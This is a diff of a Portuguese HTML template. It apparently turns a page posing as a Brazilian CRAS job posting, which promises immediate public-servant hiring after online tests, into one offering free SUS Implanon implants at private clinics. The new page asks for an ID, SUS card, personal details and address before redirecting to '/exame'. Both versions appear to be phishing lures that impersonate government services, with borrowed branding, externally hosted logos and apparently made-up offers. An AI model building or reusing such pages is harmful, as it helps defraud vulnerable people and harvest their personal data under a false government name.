@@ -1,311 +1,166 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0" name="viewport">
-    <title>Informações da Vaga - CRAS</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    
-    <style>
-        /* Rawline Font Family */
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
-          font-weight: 400;
-          font-style: normal;
-        }
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
-          font-weight: 500;
-          font-style: normal;
-        }
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
-          font-weight: 600;
-          font-style: normal;
-        }
-        @font-face {
-          font-family: 'Rawline';
-          src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
-          font-weight: 700;
-          font-style: normal;
-        }
+{% extends "layout.html" %}
 
-        body {
-            font-family: 'Rawline', sans-serif;
-            font-size: 16px;
-            color: #555;
-            line-height: 1.5;
-            margin: 0;
-            padding: 0;
-        }
-
-        strong, .font-bold {
-          font-weight: 500 !important;
-        }
-
-        .text-base {
-          font-size: 16px;
-          color: #555;
-          line-height: 1.5;
-        }
-    </style>
-</head>
-<body>
-    <!-- Government Header -->
-    <header class="bg-[#222222] text-white py-2">
-        <div class="container mx-auto flex justify-between items-center px-4">
-            <a class="font-bold text-sm" href="#">
-                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
-            </a>
-            <nav>
-                <ul class="flex space-x-4 text-[10px]">
-                    <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
-                    <li><a class="hover:underline" href="#">PARTICIPE</a></li>
-                    <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
-
-    <!-- CRAS Header -->
-    <div class="bg-[#044785] py-3">
-        <div class="container mx-auto px-4 text-center">
-            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
-        </div>
+{% block content %}
+<div class="max-w-4xl mx-auto">
+    <div class="mb-8">
+        <h1 class="text-2xl font-bold text-prosegur-black mb-4 font-heading">Informações sobre o Implanon</h1>
+        <p class="text-prosegur-gray mb-2 font-body">Sistema de Agendamento SUS - Clínicas Particulares Conveniadas</p>
+        <div class="h-1 w-32 bg-prosegur-blue"></div>
     </div>
 
- 
-
-    <!-- Main Content -->
-    <main class="container mx-auto px-4 py-8 max-w-4xl">
-
-
-        <!-- Page Header -->
-        <div class="text-center mb-8">
-        </div>
-
-        <!-- Main Content Card -->
-        <div class="bg-white rounded-lg shadow-lg p-8 mb-6">
-            <!-- Urgency Alert -->
-            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
-                <div class="flex">
-                    <div class="flex-shrink-0">
-                        <i class="fas fa-exclamation-triangle text-red-500"></i>
-                    </div>
-                    <div class="ml-3">
-                        <h3 class="text-lg font-medium text-red-800">Contratação Urgente</h3>
-                        <p class="text-red-700">
-                            O CRAS está precisando urgentemente de novos Assistentes Sociais para atender à crescente demanda de famílias em situação de vulnerabilidade social.
-                        </p>
-                    </div>
-                </div>
+    <div class="bg-white shadow-sm rounded-lg p-6 mb-8 border border-gray-200">
+        <div class="flex items-start space-x-4 mb-6">
+            <div class="flex-shrink-0">
+                <i class="fas fa-info-circle text-2xl text-prosegur-blue"></i>
             </div>
-
-            <!-- Job Benefits -->
-            <div class="mb-8">
-                <h2 class="text-2xl font-semibold text-gray-800 mb-4">
-                    Funcionário Público Efetivo
-                </h2>
-                <div class="grid md:grid-cols-2 gap-6">
-                    <div class="bg-blue-50 p-4 rounded-lg">
-                        <h3 class="font-semibold text-blue-800 mb-2">Estabilidade Profissional</h3>
-                        <ul class="text-blue-700 space-y-1">
-                            <li><i class="fas fa-check mr-2"></i>Contrato definitivo como funcionário público</li>
-                            <li><i class="fas fa-check mr-2"></i>Estabilidade no emprego garantida</li>
-                            <li><i class="fas fa-check mr-2"></i>Não pode ser demitido sem justa causa</li>
-                            <li><i class="fas fa-check mr-2"></i>Progressão de carreira</li>
-                        </ul>
-                    </div>
-                    <div class="bg-green-50 p-4 rounded-lg">
-                        <h3 class="font-semibold text-green-800 mb-2">Benefícios Completos</h3>
-                        <ul class="text-green-700 space-y-1">
-                            <li><i class="fas fa-check mr-2"></i>Salário de R$ 4.500 - R$ 5.500</li>
-                            <li><i class="fas fa-check mr-2"></i>13º salário e férias</li>
-                            <li><i class="fas fa-check mr-2"></i>Plano de saúde e odontológico</li>
-                            <li><i class="fas fa-check mr-2"></i>Vale alimentação R$ 1.320/mês</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Requirements -->
-            <div class="mb-8">
-                <h2 class="text-2xl font-semibold text-gray-800 mb-4">
-                    <i class="fas fa-clipboard-list text-[#044785] mr-2"></i>
-                    Requisitos para a Vaga
-                </h2>
-                <div class="bg-gray-50 p-6 rounded-lg">
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h3 class="font-semibold text-gray-800 mb-3">✅ O que é EXIGIDO:</h3>
-                            <ul class="text-gray-700 space-y-2">
-                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Boa comunicação com o público</li>
-                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Disposição para ajudar famílias carentes</li>
-                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Empatia e paciência</li>
-                                <li><i class="fas fa-arrow-right text-[#044785] mr-2"></i>Responsabilidade social</li>
-                            </ul>
-                        </div>
-
-                    <div class="mt-4 p-4 bg-yellow-50 border-l-4 border-yellow-400">
-                        <p class="text-yellow-800">
-                            <strong>Importante:</strong> O CRAS oferecerá toda a capacitação necessária para que você possa exercer a função com excelência.
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Assessment Process -->
-            <div class="mb-8">
-                <h2 class="text-2xl font-semibold text-gray-800 mb-4">
-                    <i class="fas fa-tasks text-[#044785] mr-2"></i>
-                    Processo de Seleção
-                </h2>
-                <div class="bg-blue-50 p-6 rounded-lg">
-                    <p class="text-blue-800 mb-4">
-                        Para garantir que você está preparado para atender as famílias com qualidade, realizaremos <strong>2 testes online</strong> simples:
-                    </p>
-                    <div class="grid md:grid-cols-2 gap-4 mb-4">
-                        <div class="bg-white p-4 rounded-lg border border-blue-200">
-                            <h4 class="font-semibold text-blue-800 mb-2">
-                                Teste 1: Inteligência Emocional
-                            </h4>
-                            <p class="text-blue-700 text-sm">
-                                Avalia sua capacidade de lidar com situações emocionais e relacionar-se com pessoas em vulnerabilidade.
-                            </p>
-                        </div>
-                        <div class="bg-white p-4 rounded-lg border border-blue-200">
-                            <h4 class="font-semibold text-blue-800 mb-2">
-                                Teste 2: Avaliação Psicotécnica
-                            </h4>
-                            <p class="text-blue-700 text-sm">
-                                Verifica suas habilidades de raciocínio e aptidão para o trabalho social.
-                            </p>
-                        </div>
-                    </div>
-                    <div class="bg-green-100 p-4 rounded-lg">
-                        <p class="text-green-800">
-                            <i class="fas fa-trophy text-yellow-500 mr-2"></i>
-                            <strong>Resultado:</strong> Obtendo uma boa nota nos testes, o CRAS fará sua contratação imediata como funcionário público efetivo!
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Action Button -->
-            <div class="text-center">
-                <button onclick="startAssessment()" class="bg-[#044785] hover:bg-blue-700 text-white font-bold py-4 px-8 rounded-lg text-lg transition-colors duration-300 shadow-lg">
-                    <i class="fas fa-play-circle mr-2"></i>
-                    Iniciar Testes de Seleção
-                </button>
-                <p class="text-gray-600 mt-3 text-sm">
-                    Os testes levam aproximadamente 15 minutos para serem concluídos
+            <div>
+                <h2 class="text-lg font-semibold text-prosegur-black mb-2 font-heading">Sobre o Implanon</h2>
+                <p class="text-prosegur-gray text-sm font-body">
+                    O Implanon é um contraceptivo subdérmico de longa duração, agora disponível gratuitamente 
+                    através do SUS em clínicas particulares conveniadas. Saiba mais sobre este método contraceptivo 
+                    moderno e eficaz.
                 </p>
             </div>
         </div>
-    </main>
 
-    <!-- Footer -->
-    <footer class="bg-[#044785] text-white py-8 md:py-12 w-full">
-        <div class="container mx-auto px-4 max-w-6xl">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">O que é o CRAS</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
-                    </ul>
+        <!-- Urgency Alert -->
+        <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
+            <div class="flex">
+                <div class="flex-shrink-0">
+                    <i class="fas fa-calendar-check text-blue-500"></i>
                 </div>
-                
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Proteção Social Básica</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Atendimento às Famílias</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Grupos de Convivência</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Benefícios Sociais</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Assistência Social</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Cadastro Único</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Bolsa Família</a></li>
-                        <li><a href="#" class="hover:text-gray-200">BPC</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Auxílio Brasil</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Programas Sociais</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Vagas</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Portal do Servidor</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
-                    </ul>
-                </div>
-            </div>
-            
-            <hr class="border-blue-400 mb-6">
-            
-            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
-                <div class="mb-4 md:mb-0 text-center md:text-left">
-                    <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
-                </div>
-                <div class="flex flex-wrap justify-center gap-2 md:gap-4 mb-4 md:mb-0">
-                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
-                    <span class="hidden md:inline">|</span>
-                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
-                    <span class="hidden md:inline">|</span>
-                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
-                    <span class="hidden md:inline">|</span>
-                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
-                    <span class="hidden md:inline">|</span>
-                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
-                </div>
-                <div class="flex space-x-4">
-                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
-                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                <div class="ml-3">
+                    <h3 class="text-lg font-medium text-blue-800">Agendamento Rápido Disponível</h3>
+                    <p class="text-blue-700">
+                        O SUS agora oferece o Implanon com agendamento rápido em clínicas particulares conveniadas, 
+                        garantindo atendimento de qualidade e maior comodidade para você.
+                    </p>
                 </div>
             </div>
         </div>
-    </footer>
 
-    <script>
-        function startAssessment() {
-            console.log('startAssessment function called');
-            try {
-                const button = document.querySelector('button[onclick="startAssessment()"]');
-                if (button) {
-                    const originalText = button.innerHTML;
-                    button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Preparando testes...';
-                    button.disabled = true;
-                    
-                    setTimeout(() => {
-                        console.log('Redirecting to /exame');
-                        window.location.href = '/exame';
-                    }, 1500);
-                } else {
-                    console.error('Button not found');
-                    window.location.href = '/exame';
-                }
-            } catch (error) {
-                console.error('Error in startAssessment:', error);
-                window.location.href = '/exame';
-            }
-        }
+        <!-- Benefits -->
+        <div class="mb-8">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-4">
+                Vantagens do Implanon
+            </h2>
+            <div class="grid md:grid-cols-2 gap-6">
+                <div class="bg-green-50 p-4 rounded-lg">
+                    <h3 class="font-semibold text-green-800 mb-2">Eficácia e Conveniência</h3>
+                    <ul class="text-green-700 space-y-1">
+                        <li><i class="fas fa-check mr-2"></i>Mais de 99% de eficácia contraceptiva</li>
+                        <li><i class="fas fa-check mr-2"></i>Proteção por até 3 anos</li>
+                        <li><i class="fas fa-check mr-2"></i>Aplicação rápida e simples</li>
+                        <li><i class="fas fa-check mr-2"></i>Reversível a qualquer momento</li>
+                    </ul>
+                </div>
+                <div class="bg-blue-50 p-4 rounded-lg">
+                    <h3 class="font-semibold text-blue-800 mb-2">Atendimento SUS</h3>
+                    <ul class="text-blue-700 space-y-1">
+                        <li><i class="fas fa-check mr-2"></i>Totalmente gratuito pelo SUS</li>
+                        <li><i class="fas fa-check mr-2"></i>Clínicas particulares conveniadas</li>
+                        <li><i class="fas fa-check mr-2"></i>Agendamento rápido e fácil</li>
+                        <li><i class="fas fa-check mr-2"></i>Acompanhamento médico incluso</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
 
-        document.addEventListener('DOMContentLoaded', function() {
-            localStorage.setItem('infoPageCompleted', 'true');
-            console.log('Info page accessed - marking as completed');
-        });
-    </script>
-</body>
-</html>
+        <!-- How it works -->
+        <div class="mb-8">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-4">
+                <i class="fas fa-clipboard-list text-prosegur-blue mr-2"></i>
+                Como Funciona o Processo
+            </h2>
+            <div class="bg-gray-50 p-6 rounded-lg">
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div>
+                        <h3 class="font-semibold text-gray-800 mb-3">✅ O que você precisa:</h3>
+                        <ul class="text-gray-700 space-y-2">
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Documento com foto</li>
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Cartão do SUS</li>
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Dados pessoais completos</li>
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Endereço para localizar clínica próxima</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="font-semibold text-gray-800 mb-3">📋 Como será o atendimento:</h3>
+                        <ul class="text-gray-700 space-y-2">
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Consulta médica prévia</li>
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Esclarecimento de dúvidas</li>
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Aplicação do implante</li>
+                            <li><i class="fas fa-arrow-right text-prosegur-blue mr-2"></i>Orientações pós-procedimento</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="mt-4 p-4 bg-yellow-50 border-l-4 border-yellow-400">
+                    <p class="text-yellow-800">
+                        <strong>Importante:</strong> O Implanon é um contraceptivo hormonal de longa duração. 
+                        A consulta médica é essencial para avaliar se é adequado para você.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Assessment Process -->
+        <div class="mb-8">
+            <h2 class="text-2xl font-semibold text-gray-800 mb-4">
+                <i class="fas fa-stethoscope text-prosegur-blue mr-2"></i>
+                Processo de Agendamento
+            </h2>
+            <div class="bg-blue-50 p-6 rounded-lg">
+                <p class="text-blue-800 mb-4">
+                    Para garantir o melhor atendimento, o processo de agendamento inclui <strong>2 etapas simples</strong>:
+                </p>
+                <div class="grid md:grid-cols-2 gap-4 mb-4">
+                    <div class="bg-white p-4 rounded-lg border border-blue-200">
+                        <h4 class="font-semibold text-blue-800 mb-2">
+                            Etapa 1: Avaliação Inicial
+                        </h4>
+                        <p class="text-blue-700 text-sm">
+                            Questionário sobre sua saúde e histórico médico para garantir que o Implanon é adequado para você.
+                        </p>
+                    </div>
+                    <div class="bg-white p-4 rounded-lg border border-blue-200">
+                        <h4 class="font-semibold text-blue-800 mb-2">
+                            Etapa 2: Confirmação de Dados
+                        </h4>
+                        <p class="text-blue-700 text-sm">
+                            Verificação de informações pessoais e localização para agendamento na clínica mais próxima.
+                        </p>
+                    </div>
+                </div>
+                <div class="bg-green-100 p-4 rounded-lg">
+                    <p class="text-green-800">
+                        <i class="fas fa-calendar-check text-green-600 mr-2"></i>
+                        <strong>Resultado:</strong> Após as etapas, você receberá a confirmação do agendamento em uma clínica conveniada próxima!
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Action Button -->
+        <div class="text-center">
+            <button onclick="startAssessment()" class="bg-prosegur-blue hover:bg-blue-700 text-white font-bold py-4 px-8 rounded-lg text-lg transition-colors duration-300 shadow-lg">
+                <i class="fas fa-clipboard-check mr-2"></i>
+                Iniciar Avaliação para Agendamento
+            </button>
+            <p class="text-gray-600 mt-3 text-sm">
+                A avaliação leva aproximadamente 10 minutos para ser concluída
+            </p>
+        </div>
+    </div>
+</div>
+
+<script>
+function startAssessment() {
+    console.log('Info page accessed - marking as completed');
+    window.location.href = '/exame';
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Info page loaded successfully');
+});
+</script>
+{% endblock %}
